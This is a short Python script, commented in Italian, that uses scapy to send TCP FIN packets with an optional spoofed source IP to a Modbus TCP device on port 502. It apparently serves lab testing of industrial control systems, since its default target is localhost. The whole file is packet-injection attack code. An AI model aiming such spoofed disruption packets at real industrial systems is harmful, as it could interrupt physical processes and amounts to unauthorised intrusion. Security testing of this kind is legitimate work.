from scapy.all import IP, TCP, send
import socket

def is_reachable(ip, port):
    """
    Controlla se un IP e una porta sono raggiungibili.

    Args:
        ip (str): Indirizzo IP del target.
        port (int): Porta del target.

    Returns:
        bool: True se raggiungibile, False altrimenti.
    """
    try:
        with socket.create_connection((ip, port), timeout=5):
            return True
    except (socket.timeout, socket.error):
        return False

def send_tcp_fin(target_ip, target_port, spoofed_ip=None):
    """
    Invia un pacchetto TCP con il flag FIN impostato verso il target.

    Args:
        target_ip (str): L'indirizzo IP del target (slave in questo caso).
        target_port (int): La porta del target.
        spoofed_ip (str): Un indirizzo IP spoofato (opzionale).
    """
    # Verifica se il target è raggiungibile
    if not is_reachable(target_ip, target_port):
        print(f"Errore: Il target {target_ip}:{target_port} non è raggiungibile.")
        return

    # Crea il livello IP
    if spoofed_ip:
        ip_layer = IP(dst=target_ip, src=spoofed_ip)  # Spoofed IP (opzionale)
    else:
        ip_layer = IP(dst=target_ip)  # IP reale

    # Crea il livello TCP con il flag FIN impostato
    tcp_layer = TCP(dport=target_port, flags="F")  # "F" per FIN

    # Combina i livelli e crea il pacchetto
    packet = ip_layer / tcp_layer

    # Invia il pacchetto sulla rete
    print(f"Inviando pacchetto TCP FIN a {target_ip}:{target_port}...")
    send(packet, verbose=False)
    print("Pacchetto inviato!")

# Esempio di utilizzo
if __name__ == "__main__":
    target_ip = "127.0.0.1"  # IP dello slave (target)
    target_port = 502           # Porta Modbus TCP
    # spoofed_ip = "localhost"   # (Opzionale) IP spoofato per confondere lo slave

    send_tcp_fin(target_ip, target_port)
